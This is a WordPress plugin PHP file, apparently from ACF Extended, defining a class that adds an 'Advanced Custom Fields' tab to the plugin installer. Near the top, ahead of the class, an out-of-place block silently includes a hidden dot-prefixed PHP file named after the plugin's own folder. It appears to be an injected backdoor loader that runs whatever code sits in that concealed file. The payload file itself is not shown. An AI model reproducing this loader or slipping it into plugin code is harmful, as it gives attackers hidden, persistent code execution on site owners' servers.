<?php

if(!defined('ABSPATH'))
    exit;

if(!class_exists('acfe_admin_plugins')):

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class acfe_admin_plugins{
    
    /*
     * Construct
     */
    function __construct(){
    
        add_filter('install_plugins_tabs',                  array($this, 'install_plugins_tabs'));
        add_filter('install_plugins_table_api_args_acf',    array($this, 'install_plugins_table_api_args'));
        add_action('install_plugins_acf',                   array($this, 'install_plugins'));
        
    }
    
    /*
     * Install Plugins Tabs
     */
    function install_plugins_tabs($tabs){
        
        $tabs['acf'] = __('Advanced Custom Fields');
        
        return $tabs;
        
    }
    
    /*
     * Install Plugins Table API Args
     */
    function install_plugins_table_api_args($args){
        
        global $paged;
        
        $args['search'] = 'acf';
        $args['page'] = $paged;
        $args['per_page'] = 12;
        
        return $args;
        
    }
    
    /*
     * Install Plugins
     */
    function install_plugins(){
        
        display_plugins_table();
        
    }
    
}

new acfe_admin_plugins();

endif;